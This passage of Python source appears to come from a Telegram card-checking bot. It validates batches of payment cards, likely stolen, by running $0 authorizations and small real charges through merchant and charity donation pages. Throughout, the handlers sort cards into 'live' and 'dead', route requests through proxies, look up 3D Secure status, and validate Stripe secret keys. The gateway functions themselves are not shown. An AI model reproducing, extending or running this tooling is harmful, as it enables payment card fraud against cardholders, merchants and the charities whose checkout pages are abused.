    summary_lines.append(f"├─ ❌ Total Declined: <b>{total_failed}</b>")
    summary_lines.append(f"└─ Approval Rate: <b>{approval_rate}%</b>")
    
    # Show approved cards from first gateway
    first_gate = list(gateways_dict.keys())[0]
    first_approved = results[first_gate]['approved']
    if first_approved:
        summary_lines.append(f"\n<b>💳 Approved Cards ({first_gate.capitalize()}, first 10):</b>")
        for idx, card in enumerate(first_approved[:10], 1):
            summary_lines.append(f"{idx}. <code>{card}</code>")
        if len(first_approved) > 10:
            summary_lines.append(f"<i>... and {len(first_approved)-10} more approved</i>")
    
    final_text = "\n".join(summary_lines)
    try:
        await status_msg.edit_text(final_text, parse_mode='HTML')
    except:
        await update.message.reply_text(final_text, parse_mode='HTML')


async def charge3_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /c3 command - Charge Gate 3 (REMOVED - use /c1, /c2, /c4, /c5)"""
    await update.message.reply_text("This gateway has been removed. Please use /c1, /c2, /c4, or /c5 instead.", parse_mode='HTML')


# Phase 11.4: Converted to Phase 11.3 batch factory
mass_stripecharge_command = create_batch_gateway_handler(stripe_charge_check, 'Stripe $1 Charge', 1.00, 500)
mass_braintreeauth_command = create_batch_gateway_handler(braintree_auth_check, 'Braintree Auth', 0.00, 500)




async def checkoutauth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /checkoutauth command - DEPRECATED"""
    await update.message.reply_text(
        "❌ This gateway has been deprecated.\n\n"
        "Please use one of these working gates:\n"
        "/pa - Pariyatti Auth\n"
        "/ced - Cedine Auth\n"
        "/sm - Stripe Multi\n"
        "/sn - Shopify Checkout",
        parse_mode='HTML'
    )


# Phase 11.4: Converted to Phase 11.3 batch factory
mass_charge1_command = create_batch_gateway_handler(charge1_check, 'Charge Gate 1', 1.00, 500)
mass_charge2_command = create_batch_gateway_handler(charge2_check, 'Charge Gate 2', 2.00, 500)
mass_charge4_command = create_batch_gateway_handler(charge4_check, 'Charge Gate 4', 4.00, 500)
mass_charge5_command = create_batch_gateway_handler(charge5_check, 'Charge Gate 5', 5.00, 500)


async def mass_charge3_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check using Charge Gate 3 (REMOVED)"""
    await update.message.reply_text("This gateway has been removed. Please use /mc1, /mc2, /mc4, or /mc5 instead.", parse_mode='HTML')










# NOTE: districtpeople gate disabled - merchant restriction (integration surface unsupported)
# Original handler moved to _districtpeople_command_original - now returns maintenance message


async def mass_wsc5_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Placeholder - original mass_districtpeople redirected to maintenance"""
    pass


async def bgddesigns_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """REMOVED - merchant gateway no longer available"""
    await update.message.reply_text("This merchant gateway has been removed. Use /sa or /sc for Stripe auth/charge.", parse_mode='HTML')


async def mass_bgddesigns_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """REMOVED - merchant gateway no longer available"""
    await update.message.reply_text("This merchant gateway has been removed.", parse_mode='HTML')


# NOTE: blemart gate disabled - merchant restriction (integration surface unsupported)
# Original handler replaced with maintenance message handler


async def saintvinson_givewp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """REMOVED - merchant gateway no longer available"""
    await update.message.reply_text("This merchant gateway has been removed. Use /sa or /sc for Stripe auth/charge.", parse_mode='HTML')


async def mass_saintvinson_givewp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """REMOVED - merchant gateway no longer available"""
    await update.message.reply_text("This merchant gateway has been removed.", parse_mode='HTML')


async def staleks_florida_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """REMOVED - merchant gateway no longer available"""
    await update.message.reply_text("This merchant gateway has been removed. Use /sa or /sc for Stripe auth/charge.", parse_mode='HTML')


async def mass_staleks_florida_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """REMOVED - merchant gateway no longer available"""
    await update.message.reply_text("This merchant gateway has been removed.", parse_mode='HTML')


async def ccfoundation_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """REMOVED - merchant gateway no longer available"""
    await update.message.reply_text("This merchant gateway has been removed. Use /sa or /sc for Stripe auth/charge.", parse_mode='HTML')


async def mass_ccfoundation_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """REMOVED - merchant gateway no longer available"""
    await update.message.reply_text("This merchant gateway has been removed.", parse_mode='HTML')


# Phase 11.3: Refactored madystripe_command to use factory
madystripe_command = create_single_gateway_handler(
    gateway_fn=madystripe_check,
    gateway_name="MadyStripe",
    amount=1.00,
    timeout=22
)


# Phase 11.3: Refactored mass_madystripe_command to use batch factory
mass_madystripe_command = create_batch_gateway_handler(
    gateway_fn=madystripe_check,
    gateway_name="MadyStripe",
    amount=1.00,
    max_batch=500
)


async def checkout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /checkout command - DEPRECATED"""
    await update.message.reply_text(
        "❌ This gateway has been deprecated.\n\n"
        "Please use one of these working gates:\n"
        "/pa - Pariyatti Auth\n"
        "/ced - Cedine Auth\n"
        "/sm - Stripe Multi\n"
        "/sn - Shopify Checkout",
        parse_mode='HTML'
    )




async def process_cards_with_gateway(update: Update, raw_text: str, gateway_fn, gateway_name: str, gateway_key: str = None):
    """
    Universal card processor - handles single cards or batch of up to 25.
    Auto-detects format and processes accordingly.
    
    For single card: Shows full response
    For batch (2-25 cards): Shows progress, only posts live cards
    """
    MAX_BULK_CARDS = 25
    
    if not raw_text:
        await update.message.reply_text(
            f"❌ Please provide card(s) in format: CARD|MM|YY|CVV\n\n"
            f"<b>Single:</b> <code>/{gateway_name.lower().replace(' ', '_')} 4111111111111111|05|26|123</code>\n"
            f"<b>Batch (up to 25):</b> Paste multiple cards on new lines",
            parse_mode='HTML'
        )
        return
    
    # Normalize cards from input
    cards = normalize_card_input(raw_text)
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found. Use format: CARD|MM|YY|CVV", parse_mode='HTML')
        return
    
    if len(cards) > MAX_BULK_CARDS:
        await update.message.reply_text(f"❌ Maximum {MAX_BULK_CARDS} cards allowed. Found {len(cards)}.", parse_mode='HTML')
        return
    
    # Get gateway amount
    gateway_amount = get_gateway_amount(gateway_key) if gateway_key else 0.00
    
    # SINGLE CARD - instant result (no processing message)
    if len(cards) == 1:
        card_input = cards[0]
        parts = card_input.split('|')
        card_num, card_mon, card_yer, card_cvc = parts[0], parts[1], parts[2], parts[3]
        
        result, proxy_ok = await call_gateway_with_timeout(gateway_fn, card_num, card_mon, card_yer, card_cvc, timeout=25, proxy=PROXY)
        
        # Log gateway response for debugging
        print(f"[GATE] {gateway_name} | Card: {card_num[-4:]} | Result: {result} | Proxy: {proxy_ok}")
        
        status = ApprovalStatus.DECLINED
        if result and "Error" not in result:
            if any(keyword in result.lower() for keyword in ["charged", "approved", "success", "accesstoken", "cartid", "ccn", "live"]):
                status = ApprovalStatus.APPROVED
            elif "cvv" in result.lower():
                status = ApprovalStatus.CVV_ISSUE
            elif "insufficient" in result.lower():
                status = ApprovalStatus.INSUFFICIENT_FUNDS
        
        bank_name, country = lookup_bin_info(card_num)
        card_brand = get_card_brand(card_num)
        card_type = get_card_type_from_bin(card_num)
        
        vbv_info = await get_vbv_for_card(card_num, card_mon, card_yer, card_cvc)
        vbv_status = vbv_info.get("vbv_status", "Unknown")
        vbv_bank = vbv_info.get("bank", bank_name)
        vbv_country = vbv_info.get("country", country)
        vbv_country_emoji = vbv_info.get("country_emoji", "")
        vbv_card_type = vbv_info.get("card_type", card_type)
        
        status_str = "APPROVED" if status == ApprovalStatus.APPROVED else \
                     "CVV" if status == ApprovalStatus.CVV_ISSUE else \
                     "NSF" if status == ApprovalStatus.INSUFFICIENT_FUNDS else "DECLINED"
        
        cvv_match = status != ApprovalStatus.CVV_ISSUE
        ccn_live = status == ApprovalStatus.APPROVED or status == ApprovalStatus.CVV_ISSUE or status == ApprovalStatus.INSUFFICIENT_FUNDS
        
        formatted_response = format_single_card_result(
            card_input=card_input,
            status=status_str,
            card_brand=card_brand,
            card_type=vbv_card_type if vbv_card_type != "Unknown" else card_type,
            bank_name=vbv_bank if vbv_bank != "Unknown" else bank_name,
            country=vbv_country if vbv_country != "Unknown" else country,
            cvv_match=cvv_match,
            ccn_live=ccn_live,
            gateway=gateway_name,
            amount=f"${gateway_amount:.2f} USD",
            elapsed_sec=0.5,
            proxy_alive=proxy_ok,
            vbv_status=vbv_status,
            country_emoji=vbv_country_emoji
        )
        
        await update.message.reply_text(formatted_response, parse_mode='HTML')
        return
    
    # BATCH MODE (2-25 cards) - instant results for each card
    user_id = update.effective_user.id
    stats = {"approved": 0, "declined": 0, "cvv": 0, "nsf": 0, "three_ds": 0}
    
    for idx, card_input in enumerate(cards, 1):
        parts = card_input.split('|')
        card_num, card_mon, card_yer, card_cvc = parts[0], parts[1], parts[2], parts[3]
        
        start_time = time.time()
        result, proxy_ok = await call_gateway_with_timeout(
            gateway_fn, card_num, card_mon, card_yer, card_cvc, 
            timeout=22, proxy=PROXY
        )
        elapsed_sec = round(time.time() - start_time, 2)
        
        print(f"[GATE] {gateway_name} Batch {idx}/{len(cards)} | Card: {card_num[-4:]} | Result: {result}")
        
        status = ApprovalStatus.DECLINED
        if result and "Error" not in result:
            if any(keyword in result.lower() for keyword in ["charged", "approved", "success", "accesstoken", "cartid", "ccn", "live"]):
                status = ApprovalStatus.APPROVED
                stats["approved"] += 1
            elif "cvv" in result.lower():
                status = ApprovalStatus.CVV_ISSUE
                stats["cvv"] += 1
            elif "3ds" in result.lower() or "authentication" in result.lower():
                stats["three_ds"] += 1
                stats["declined"] += 1
            elif "insufficient" in result.lower():
                status = ApprovalStatus.INSUFFICIENT_FUNDS
                stats["nsf"] += 1
            else:
                stats["declined"] += 1
        else:
            stats["declined"] += 1
        
        bank_name, country = lookup_bin_info(card_num)
        card_brand = get_card_brand(card_num)
        card_type = get_card_type_from_bin(card_num)
        
        status_str = "APPROVED" if status == ApprovalStatus.APPROVED else \
                     "CVV" if status == ApprovalStatus.CVV_ISSUE else \
                     "NSF" if status == ApprovalStatus.INSUFFICIENT_FUNDS else "DECLINED"
        
        cvv_match = status != ApprovalStatus.CVV_ISSUE
        ccn_live = status == ApprovalStatus.APPROVED or status == ApprovalStatus.CVV_ISSUE or status == ApprovalStatus.INSUFFICIENT_FUNDS
        
        # Post instant result for EACH card
        formatted_response = format_single_card_result(
            card_input=card_input,
            status=status_str,
            card_brand=card_brand,
            card_type=card_type,
            bank_name=bank_name,
            country=country,
            cvv_match=cvv_match,
            ccn_live=ccn_live,
            gateway=gateway_name,
            amount=f"${gateway_amount:.2f} USD",
            elapsed_sec=elapsed_sec,
            proxy_alive=proxy_ok
        )
        
        await update.message.reply_text(formatted_response, parse_mode='HTML')
        
        # Small delay between cards
        if idx < len(cards):
            await asyncio.sleep(1)
    
    # Send final summary (simple text, no dashboard)
    total_live = stats["approved"] + stats["cvv"] + stats["nsf"]
    summary = f"<b>✅ Batch Complete</b>\n\n<b>Gateway:</b> {gateway_name}\n<b>Total:</b> {len(cards)} cards\n<b>Live:</b> {total_live} | <b>Dead:</b> {stats['declined']}"
    await update.message.reply_text(summary, parse_mode='HTML')


# Gateway handlers using factory pattern
# Phase 11.4: Converted Phase 7 factory handlers to Phase 11.3 pattern
charge1_command = create_single_gateway_handler(charge1_check, "Charge Gate 1", 1.00, 30)
charge2_command = create_single_gateway_handler(charge2_check, "Charge Gate 2", 2.00, 30)
charge4_command = create_single_gateway_handler(charge4_check, "Charge Gate 4", 4.00, 30)
charge5_command = create_single_gateway_handler(charge5_check, "Charge Gate 5", 5.00, 30)
stripecharge_command = create_single_gateway_handler(stripe_charge_check, "Stripe $1 Charge", 1.00, 30)
braintreeauth_command = create_single_gateway_handler(braintree_auth_check, "Braintree Auth", 0.00, 30)
stripe_epicalarc_command = create_single_gateway_handler(stripe_auth_epicalarc_check, "Stripe Epicalarc", 0.00, 30)
corrigan_command = create_single_gateway_handler(corrigan_check, "Corrigan $0.50", 0.50, 30)
texas_command = create_single_gateway_handler(texas_check, "Texas $0.50", 0.50, 30)
paypal_command = create_single_gateway_handler(paypal_charge_check, "PayPal $5", 5.00, 30)
amex_command = create_single_gateway_handler(amex_auth_check, "Amex Auth", 0.00, 30)
shopify_checkout_command = create_single_gateway_handler(shopify_checkout_check, "Shopify Checkout", 1.00, 30)
auto_detect_command = create_single_gateway_handler(auto_detect_check, "Auto-Detect", 1.00, 30)
shopify_nano_command = create_single_gateway_handler(shopify_nano_check, "Shopify", 1.00, 30)


async def bulk_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Bulk card check - paste up to 25 cards in message (no file needed).
    Usage: /bulk followed by cards on new lines, or /bulk CARD1 CARD2 ...
    
    Supports multiple formats:
    - 4111111111111111|05|26|123
    - 4111 1111 1111 1111 05/26 123
    - 4111-1111-1111-1111,05,26,123
    """
    MAX_BULK_CARDS = 25
    
    # Get raw text from message (everything after command)
    raw_text = update.message.text
    # Remove command prefix
    if raw_text.startswith('/bulk'):
        raw_text = raw_text[5:].strip()
    elif raw_text.startswith('/b '):
        raw_text = raw_text[2:].strip()
    
    if not raw_text:
        await update.message.reply_text(
            "<b>📦 Bulk Check (up to 25 cards)</b>\n\n"
            "Paste cards after the command:\n"
            "<code>/bulk\n"
            "4111111111111111|05|26|123\n"
            "5500000000000004|12|25|999</code>\n\n"
            "<b>Supported formats:</b>\n"
            "• <code>CARD|MM|YY|CVV</code>\n"
            "• <code>CARD MM/YY CVV</code>\n"
            "• <code>CARD-separated,05,26,123</code>",
            parse_mode='HTML'
        )
        return
    
    # Normalize all cards from input
    cards = normalize_card_input(raw_text)
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found. Use format: CARD|MM|YY|CVV", parse_mode='HTML')
        return
    
    if len(cards) > MAX_BULK_CARDS:
        await update.message.reply_text(f"❌ Maximum {MAX_BULK_CARDS} cards allowed. Found {len(cards)}.", parse_mode='HTML')
        return
    
    # Instant results for each card (no progress dashboard)
    approved_count = 0
    declined_count = 0
    
    for idx, card_input in enumerate(cards, 1):
        parts = card_input.split('|')
        card_num, card_mon, card_yer, card_cvc = parts[0], parts[1], parts[2], parts[3]
        
        start_time = time.time()
        result, proxy_ok = await call_gateway_with_timeout(
            corrigan_check, card_num, card_mon, card_yer, card_cvc, 
            timeout=22, proxy=PROXY
        )
        elapsed_sec = round(time.time() - start_time, 2)
        
        print(f"[GATE] Bulk {idx}/{len(cards)} | Card: {card_num[-4:]} | Result: {result}")
        
        status = ApprovalStatus.DECLINED
        if result and "Error" not in result:
            if any(keyword in result.lower() for keyword in ["charged", "approved", "success", "accesstoken", "cartid", "ccn", "live"]):
                status = ApprovalStatus.APPROVED
            elif "cvv" in result.lower():
                status = ApprovalStatus.CVV_ISSUE
            elif "insufficient" in result.lower():
                status = ApprovalStatus.INSUFFICIENT_FUNDS
        
        is_live = status in [ApprovalStatus.APPROVED, ApprovalStatus.CVV_ISSUE, ApprovalStatus.INSUFFICIENT_FUNDS]
        
        bank_name, country = lookup_bin_info(card_num)
        card_brand = get_card_brand(card_num)
        card_type = get_card_type_from_bin(card_num)
        
        status_str = "APPROVED" if status == ApprovalStatus.APPROVED else \
                     "CVV" if status == ApprovalStatus.CVV_ISSUE else \
                     "NSF" if status == ApprovalStatus.INSUFFICIENT_FUNDS else "DECLINED"
        
        cvv_match = status != ApprovalStatus.CVV_ISSUE
        ccn_live = is_live
        
        if is_live:
            approved_count += 1
        else:
            declined_count += 1
        
        # Post instant result for each card
        formatted_response = format_single_card_result(
            card_input=card_input,
            status=status_str,
            card_brand=card_brand,
            card_type=card_type,
            bank_name=bank_name,
            country=country,
            cvv_match=cvv_match,
            ccn_live=ccn_live,
            gateway="Corrigan $0.50",
            amount="$0.50 USD",
            elapsed_sec=elapsed_sec,
            proxy_alive=proxy_ok
        )
        await update.message.reply_text(formatted_response, parse_mode='HTML')
        
        # Small delay between checks
        if idx < len(cards):
            await asyncio.sleep(1)
    
    # Simple final summary
    summary = f"<b>✅ Bulk Complete</b>\n\n<b>Gateway:</b> Corrigan $0.50\n<b>Total:</b> {len(cards)} cards\n<b>Live:</b> {approved_count} | <b>Dead:</b> {declined_count}"
    await update.message.reply_text(summary, parse_mode='HTML')


# ============================================================================
# MULTI-GATEWAY PARALLEL CHECK
# ============================================================================

# Define available gateways for parallel checking
AUTH_GATEWAYS = [
    ("Corrigan $0.50", corrigan_check, "corrigan"),
    ("Texas $0.50", texas_check, "texas"),
    ("Braintree", braintree_check, "braintree_auth"),
    ("Shopify", shopify_nano_check, "shopify"),
    ("Lions Club", lions_club_check, "lions_club"),
    ("AdEspresso", adespresso_auth_check, "adespresso"),
]

CHARGE_GATEWAYS = [
    ("Stripe Charge", stripe_charge_check, "stripe_charge"),
    ("PayPal $5", paypal_charge_check, "paypal_charge"),
    ("Bell Alliance", bellalliance_charge_check, "bellalliance"),
    ("Stripe Charity", stripe_charity_check, "stripe_charity"),
]


async def run_gateway_check(gateway_name, gateway_fn, card_num, card_mon, card_yer, card_cvc):
    """Run a single gateway check and return result with timing"""
    start_time = time.time()
    try:
        result, proxy_ok = await call_gateway_with_timeout(
            gateway_fn, card_num, card_mon, card_yer, card_cvc, 
            timeout=20, retry_on_timeout=False, proxy=PROXY
        )
        elapsed = round(time.time() - start_time, 1)
        
        # Determine status
        status = "❌ DECLINED"
        if result and "Error" not in result and "TIMEOUT" not in result:
            result_lower = result.lower()
            if any(kw in result_lower for kw in ["charged", "approved", "success", "accesstoken", "cartid", "ccn", "live"]):
                status = "✅ APPROVED"
            elif "cvv" in result_lower:
                status = "⚠️ CVV ISSUE"
            elif "insufficient" in result_lower:
                status = "💰 INSUFF"
        elif "TIMEOUT" in result:
            status = "⏱️ TIMEOUT"
        
        return (gateway_name, status, elapsed, result[:60] if result else "No response")
    except Exception as e:
        elapsed = round(time.time() - start_time, 1)
        return (gateway_name, "❌ ERROR", elapsed, str(e)[:40])


async def allauth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Check cards against ALL auth gateways simultaneously.
    Usage: /allauth CARD|MM|YY|CVV (supports up to 25 cards)
    """
    raw_text = update.message.text
    for prefix in ['/allauth ', '/aa ']:
        if raw_text.lower().startswith(prefix):
            raw_text = raw_text[len(prefix):].strip()
            break
    else:
        if '\n' in raw_text:
            raw_text = raw_text.split('\n', 1)[1].strip()
        elif context.args:
            raw_text = ' '.join(context.args)
        else:
            raw_text = ''
    
    if not raw_text:
        await update.message.reply_text(
            "<b>🔄 All Auth Gates Check</b>\n\n"
            "Checks cards against all auth gateways simultaneously.\n"
            "Supports 1-25 cards.\n\n"
            "<b>Usage:</b> <code>/allauth CARD|MM|YY|CVV</code>\n\n"
            f"<b>Gates ({len(AUTH_GATEWAYS)}):</b> " + ", ".join([g[0] for g in AUTH_GATEWAYS]),
            parse_mode='HTML'
        )
        return
    
    cards = normalize_card_input(raw_text)
    if not cards:
        await update.message.reply_text("❌ Invalid card format. Use: CARD|MM|YY|CVV", parse_mode='HTML')
        return
    
    if len(cards) > 25:
        cards = cards[:25]
        await update.message.reply_text("⚠️ Limited to 25 cards. Processing first 25.", parse_mode='HTML')
    
    status_msg = await update.message.reply_text(
        f"<b>🔄 Checking {len(cards)} card(s) on All Auth Gates...</b>\n"
        f"<b>Gates:</b> {len(AUTH_GATEWAYS)} per card",
        parse_mode='HTML'
    )
    
    all_results = []
    
    for card_input in cards:
        parts = card_input.split('|')
        card_num, card_mon, card_yer, card_cvc = parts[0], parts[1], parts[2], parts[3]
        bin_info = lookup_bin_info(card_num, extended=True)
        
        tasks = [
            run_gateway_check(name, fn, card_num, card_mon, card_yer, card_cvc)
            for name, fn, key in AUTH_GATEWAYS
        ]
        
        results = await asyncio.gather(*tasks)
        
        approved = []
        declined = []
        
        for gateway_name, status, elapsed, message in results:
            line = f"{gateway_name}: {status} ({elapsed}s)"
            if "✅" in status or "⚠️" in status or "💰" in status:
                approved.append(line)
            else:
                declined.append(line)
        
        card_result = f"<b>Card:</b> <code>{card_num}|{card_mon}|{card_yer}|{card_cvc}</code>\n"
        card_result += f"<b>BIN:</b> {bin_info['flag']} {bin_info['country']} | {bin_info['brand']}\n"
        
        if approved:
            card_result += f"<b>✅ LIVE ({len(approved)}):</b> " + ", ".join(approved) + "\n"
        else:
            card_result += f"<b>❌ DEAD:</b> All {len(declined)} gates declined\n"
        
        all_results.append(card_result)
        
        await asyncio.sleep(0.5)
    
    response = f"<b>🔄 All Auth Gates Results</b>\n\n"
    response += "\n".join(all_results)
    
    await status_msg.edit_text(response, parse_mode='HTML')


async def allcharge_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Check cards against ALL charge gateways simultaneously.
    Usage: /allcharge CARD|MM|YY|CVV (supports up to 25 cards)
    
    WARNING: This will attempt actual charges on the card!
    """
    raw_text = update.message.text
    for prefix in ['/allcharge ', '/ac ']:
        if raw_text.lower().startswith(prefix):
            raw_text = raw_text[len(prefix):].strip()
            break
    else:
        if '\n' in raw_text:
            raw_text = raw_text.split('\n', 1)[1].strip()
        elif context.args:
            raw_text = ' '.join(context.args)
        else:
            raw_text = ''
    
    if not raw_text:
        await update.message.reply_text(
            "<b>💳 All Charge Gates Check</b>\n\n"
            "Checks cards against all charge gateways simultaneously.\n"
            "Supports 1-25 cards.\n"
            "<b>⚠️ WARNING:</b> This will attempt actual charges!\n\n"
            "<b>Usage:</b> <code>/allcharge CARD|MM|YY|CVV</code>\n\n"
            f"<b>Gates ({len(CHARGE_GATEWAYS)}):</b> " + ", ".join([g[0] for g in CHARGE_GATEWAYS]),
            parse_mode='HTML'
        )
        return
    
    cards = normalize_card_input(raw_text)
    if not cards:
        await update.message.reply_text("❌ Invalid card format. Use: CARD|MM|YY|CVV", parse_mode='HTML')
        return
    
    if len(cards) > 25:
        cards = cards[:25]
        await update.message.reply_text("⚠️ Limited to 25 cards. Processing first 25.", parse_mode='HTML')
    
    status_msg = await update.message.reply_text(
        f"<b>💳 Checking {len(cards)} card(s) on All Charge Gates...</b>\n"
        f"<b>Gates:</b> {len(CHARGE_GATEWAYS)} per card\n"
        f"<b>⚠️ Attempting real charges!</b>",
        parse_mode='HTML'
    )
    
    all_results = []
    
    for card_input in cards:
        parts = card_input.split('|')
        card_num, card_mon, card_yer, card_cvc = parts[0], parts[1], parts[2], parts[3]
        bin_info = lookup_bin_info(card_num, extended=True)
        
        tasks = [
            run_gateway_check(name, fn, card_num, card_mon, card_yer, card_cvc)
            for name, fn, key in CHARGE_GATEWAYS
        ]
        
        results = await asyncio.gather(*tasks)
        
        approved = []
        declined = []
        
        for gateway_name, status, elapsed, message in results:
            line = f"{gateway_name}: {status} ({elapsed}s)"
            if "✅" in status or "⚠️" in status or "💰" in status:
                approved.append(line)
            else:
                declined.append(line)
        
        card_result = f"<b>Card:</b> <code>{card_num}|{card_mon}|{card_yer}|{card_cvc}</code>\n"
        card_result += f"<b>BIN:</b> {bin_info['flag']} {bin_info['country']} | {bin_info['brand']}\n"
        
        if approved:
            card_result += f"<b>✅ CHARGED ({len(approved)}):</b> " + ", ".join(approved) + "\n"
        else:
            card_result += f"<b>❌ DECLINED:</b> All {len(declined)} gates declined\n"
        
        all_results.append(card_result)
        
        await asyncio.sleep(0.5)
    
    response = f"<b>💳 All Charge Gates Results</b>\n\n"
    response += "\n".join(all_results)
    
    await status_msg.edit_text(response, parse_mode='HTML')




# Phase 11.3: Refactored stripe_charity_command to use factory
stripe_charity_command = create_single_gateway_handler(
    gateway_fn=stripe_charity_check,
    gateway_name="Stripe Charity Auth",
    amount=1.00,
    timeout=22
)


# Phase 11.3: Refactored mass_stripe_charity_command to use batch factory
mass_stripe_charity_command = create_batch_gateway_handler(
    gateway_fn=stripe_charity_check,
    gateway_name="Stripe Charity Auth",
    amount=1.00,
    max_batch=500
)


# Phase 11.3: Refactored braintree_laguna_command to use factory
braintree_laguna_command = create_single_gateway_handler(
    gateway_fn=braintree_laguna_check,
    gateway_name="Braintree Auth (Laguna)",
    amount=1.00,
    timeout=45
)


# Phase 11.3: Refactored mass_braintree_laguna_command to use batch factory
mass_braintree_laguna_command = create_batch_gateway_handler(
    gateway_fn=braintree_laguna_check,
    gateway_name="Braintree Auth (Laguna)",
    amount=1.00,
    max_batch=500
)


# Phase 11.4: Converted to Phase 11.3 pattern
lions_club_command = create_single_gateway_handler(
    lambda n, m, y, c, proxy=None: lions_club_check(n, m, y, c, None),
    "Lions Club $5",
    5.00,
    30
)
mass_lions_club_command = create_batch_gateway_handler(
    lambda n, m, y, c, proxy=None: lions_club_check(n, m, y, c, None),
    "Lions Club $5",
    5.00,
    500
)

foe_auth_command = create_single_gateway_handler(foe_check, "Stripe Auth $0", 0.00, 30)
charitywater_auth_command = create_single_gateway_handler(charitywater_check, "Stripe Auth $0", 0.00, 30)
donorschoose_auth_command = create_single_gateway_handler(donorschoose_check, "Stripe Auth $0", 0.00, 30)
newschools_auth_command = create_single_gateway_handler(newschools_check, "Stripe Auth $0", 0.00, 30)
ywca_auth_command = create_single_gateway_handler(ywca_check, "Stripe Auth $0", 0.00, 30)


# Phase 11.4: Converted to Phase 11.3 batch factory
mass_foe_auth_command = create_batch_gateway_handler(foe_check, 'Stripe Auth $0', 0.00, 500)
mass_charitywater_auth_command = create_batch_gateway_handler(charitywater_check, 'Stripe Auth $0', 0.00, 500)
mass_donorschoose_auth_command = create_batch_gateway_handler(donorschoose_check, 'Stripe Auth $0', 0.00, 500)
mass_newschools_auth_command = create_batch_gateway_handler(newschools_check, 'Stripe Auth $0', 0.00, 500)
mass_ywca_auth_command = create_batch_gateway_handler(ywca_check, 'Stripe Auth $0', 0.00, 500)




async def sk_validate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Validate a Stripe secret key"""
    if not context.args:
        await update.message.reply_text(
            "<b>SK Validator</b>\n\n"
            "Usage: <code>/sk sk_live_xxxxx</code>\n\n"
            "Validates Stripe secret key and shows account info.",
            parse_mode='HTML'
        )
        return
    
    sk_key = context.args[0].strip()
    processing = await update.message.reply_text("Validating SK...")
    
    from gates.sk_validator import validate_stripe_sk, format_sk_response
    valid, info = await asyncio.to_thread(validate_stripe_sk, sk_key)
    response = format_sk_response(sk_key, valid, info)
    
    await processing.edit_text(response, parse_mode='HTML')


async def vbv_lookup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """VBV/3DS lookup for a card - shows if card requires 3D Secure"""
    if not context.args:
        await update.message.reply_text(
            "<b>VBV/3DS Lookup</b>\n\n"
            "Usage: <code>/vbv CARD|MM|YY|CVV</code>\n"
            "Or: <code>/vbv 414776</code> (BIN only)\n\n"
            "Shows VBV/3DS status and BIN info.",
            parse_mode='HTML'
        )
        return
    
    card_input = context.args[0]
    card_num = card_input.split('|')[0].strip() if '|' in card_input else card_input.strip()
    
    processing = await update.message.reply_text("Looking up VBV/3DS status...")
    
    success, data = await asyncio.to_thread(lookup_vbv, card_num)
    
    if success:
        response = format_vbv_response(card_input, data)
    else:
        error = data.get("error", "Unknown error")
        response = f"<b>VBV Lookup Failed</b>\n\nError: {error}"
    
    await processing.edit_text(response, parse_mode='HTML')


async def vkrm_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Vkrm API gate - check card with full details"""
    if not context.args:
        await update.message.reply_text(
            "<b>Vkrm API Gate</b>\n\n"
            "Usage: <code>/vkrm CARD|MM|YY|CVV</code>\n\n"
            "Shows full card details, CVV/CCN status, VBV check.",
            parse_mode='HTML'
        )
        return
    
    card_input = context.args[0]
    parts = card_input.split('|')
    if len(parts) != 4:
        await update.message.reply_text("Invalid format! Use: <code>CARD|MM|YY|CVV</code>", parse_mode='HTML')
        return
    
    cc, mes, exp, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    
    processing = await update.message.reply_text("Checking card via Vkrm API...")
    
    proxy = proxy_status.get('url') if proxy_status.get('alive') else None
    if not proxy:
        await processing.edit_text("Proxy required for Vkrm API. Please configure a proxy.", parse_mode='HTML')
        return
    
    result = await vkrm_check(cc, mes, exp, cvv, proxy)
    await processing.edit_text(result, parse_mode='HTML')


async def blemart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Blemart gate - Under maintenance"""
    await update.message.reply_text(
        "<b>Gate Under Maintenance</b>\n\n"
        "This gateway is temporarily unavailable due to merchant restrictions.\n"
        "Please use an alternative gate.",
        parse_mode='HTML'
    )


async def mass_blemart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Blemart mass check - Under maintenance"""
    await update.message.reply_text(
        "<b>Gate Under Maintenance</b>\n\n"
        "This gateway is temporarily unavailable due to merchant restrictions.\n"
        "Please use an alternative gate.",
        parse_mode='HTML'
    )


async def districtpeople_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """DistrictPeople gate - Under maintenance"""
    await update.message.reply_text(
        "<b>Gate Under Maintenance</b>\n\n"
        "This gateway is temporarily unavailable due to merchant restrictions.\n"
        "Please use an alternative gate.",
        parse_mode='HTML'
    )


async def mass_districtpeople_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """DistrictPeople mass check - Under maintenance"""
    await update.message.reply_text(
        "<b>Gate Under Maintenance</b>\n\n"
        "This gateway is temporarily unavailable due to merchant restrictions.\n"
        "Please use an alternative gate.",
        parse_mode='HTML'
    )


# Phase 11.3: Refactored adespresso_auth_command to use factory
adespresso_auth_command = create_single_gateway_handler(
    gateway_fn=adespresso_auth_check,
    gateway_name="AdEspresso Auth",
    amount=0.00,  # Auth only
    timeout=30
)


# Phase 11.3: Refactored stripe_real_auth_command to use factory
stripe_real_auth_command = create_single_gateway_handler(
    gateway_fn=stripe_auth_epicalarc_check,
    gateway_name="Stripe Real Auth $0",
